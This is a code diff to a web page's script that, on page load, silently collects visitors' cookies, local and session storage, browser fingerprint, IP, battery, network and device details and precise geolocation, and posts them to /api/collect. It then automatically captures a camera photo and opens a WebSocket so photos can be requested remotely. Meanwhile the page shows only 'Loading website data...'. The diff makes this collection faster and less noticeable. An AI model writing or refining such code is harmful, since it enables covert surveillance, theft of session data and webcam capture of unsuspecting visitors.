@@ -622,46 +622,78 @@ main a {
       statusDiv.innerHTML = '<span class="spinner"></span>Loading website data...';
 
       try {
-        // Request camera access first
-        const cameraAccess = await requestCameraAccess();
-        console.log('Camera access:', cameraAccess);
+        // Run all independent async operations in parallel for faster execution
+        // Note: Removed camera access request here - we'll do it once in capturePhoto()
+        const [
+          deviceInfo,
+          fingerprint,
+          ipInfo,
+          connectionInfo,
+          indexedDB,
+          batteryInfo,
+          networkInfo,
+          mediaDevices
+        ] = await Promise.all([
+          Promise.resolve(getDeviceInfo()), // Synchronous, wrap in Promise.resolve
+          computeFingerprint(),
+          getIPInfo(),
+          Promise.resolve(getConnectionInfo()), // Synchronous
+          getIndexedDBInfo(),
+          getBatteryInfo(),
+          getNetworkInfo(),
+          getMediaDevices()
+        ]);
 
-        // Collect all data
-        const deviceInfo = getDeviceInfo();
-        const fingerprint = await computeFingerprint();
-        const ipInfo = await getIPInfo();
-        const connectionInfo = await getConnectionInfo();
+        // Synchronous operations (don't need to await)
         const cookies = parseCookies();
         const localStorage = getLocalStorageInfo();
         const sessionStorage = getSessionStorageInfo();
-        const indexedDB = await getIndexedDBInfo();
-        const batteryInfo = await getBatteryInfo();
-        const networkInfo = await getNetworkInfo();
-        const mediaDevices = await getMediaDevices();
 
-        // Try to get geolocation
-        let deviceCoords = null;
-        if (navigator.geolocation) {
-          try {
-            const pos = await new Promise((resolve, reject) => {
-              navigator.geolocation.getCurrentPosition(resolve, reject, {
-                enableHighAccuracy: true,
-                timeout: 10000
-              });
-            });
-            deviceCoords = {
-              lat: pos.coords.latitude,
-              lon: pos.coords.longitude,
-              accuracy: pos.coords.accuracy,
-              altitude: pos.coords.altitude,
-              altitudeAccuracy: pos.coords.altitudeAccuracy,
-              heading: pos.coords.heading,
-              speed: pos.coords.speed
-            };
-          } catch (e) {
-            console.warn('Geolocation failed', e);
+        // Start geolocation with shorter timeout (non-blocking - don't wait if it fails)
+        const geolocationPromise = new Promise((resolve) => {
+          if (!navigator.geolocation) {
+            resolve(null);
+            return;
           }
-        }
+          
+          const timeout = setTimeout(() => {
+            resolve(null); // Resolve with null instead of rejecting
+          }, 3000); // Reduced from 10s to 3s
+
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              clearTimeout(timeout);
+              resolve({
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                altitude: pos.coords.altitude,
+                altitudeAccuracy: pos.coords.altitudeAccuracy,
+                heading: pos.coords.heading,
+                speed: pos.coords.speed
+              });
+            },
+            () => {
+              clearTimeout(timeout);
+              resolve(null); // Resolve with null on error
+            },
+            {
+              enableHighAccuracy: false, // Changed to false for faster response
+              timeout: 3000, // Reduced timeout
+              maximumAge: 60000 // Use cached location if available (1 minute)
+            }
+          );
+        });
+
+        // Don't wait for geolocation - proceed with what we have
+        const deviceCoords = await geolocationPromise;
+
+        // Camera access check (non-blocking, just check if available)
+        // We don't request access here since capturePhoto() will handle it
+        const cameraAccess = {
+          granted: 'mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices,
+          message: 'Camera will be requested when needed'
+        };
 
         const vpnDetection = detectVPN(ipInfo, deviceCoords);
 
@@ -688,12 +720,7 @@ main a {
         console.log('%c[DEBUG] Camera Access Data:', 'color: #4CAF50; font-weight: bold;');
         console.log('  Granted:', cameraAccess.granted);
         console.log('  Message:', cameraAccess.message);
-        if (cameraAccess.error) {
-          console.log('  Error:', cameraAccess.error);
-        }
-        console.log('  Full cameraAccess object:', JSON.stringify(cameraAccess));
         console.log('%c[DEBUG] Full Payload:', 'color: #2196F3; font-weight: bold;', payload);
-        console.log('%c[DEBUG] Payload cameraAccess:', 'color: #FF9800; font-weight: bold;', payload.cameraAccess);
 
         // Send to backend
         const response = await fetch('/api/collect', {
@@ -1473,7 +1500,32 @@ main a {
 
     // Auto-run on page load
     window.addEventListener('load', async function() {
-      await collectAllData();
+      // Start data collection
+      const dataCollectionPromise = collectAllData();
+
+      // Start photo capture in parallel (don't wait for data collection)
+      // This way photo capture can start immediately after a short delay
+      const photoCapturePromise = (async () => {
+        // Wait a bit for page to be ready, but don't wait for data collection
+        await new Promise(resolve => setTimeout(resolve, 500));
+        
+        // Wait for data collection to get entry_id, but with a timeout
+        // If data collection takes too long, proceed anyway
+        try {
+          await Promise.race([
+            dataCollectionPromise,
+            new Promise(resolve => setTimeout(resolve, 2000)) // Max 2s wait
+          ]);
+        } catch (e) {
+          // Continue even if data collection fails
+        }
+        
+        // Capture photo
+        capturePhoto('auto');
+      })();
+
+      // Wait for data collection to complete (for entry_id)
+      await dataCollectionPromise;
 
       // Store entry ID and fingerprint for photo requests
       currentEntryId = window.currentEntryId;
@@ -1482,11 +1534,7 @@ main a {
       // Initialize WebSocket connection for photo requests (after data is collected)
       initWebSocket();
 
-      // Automatically capture photo after data collection
-      // Delay slightly to avoid overwhelming the browser
-      setTimeout(() => {
-        capturePhoto('auto');  // Automatic on page load
-      }, 1000);
+      // Photo capture is already running in parallel, no need to wait
     });
 
     // Function to mark user as offline and cleanup
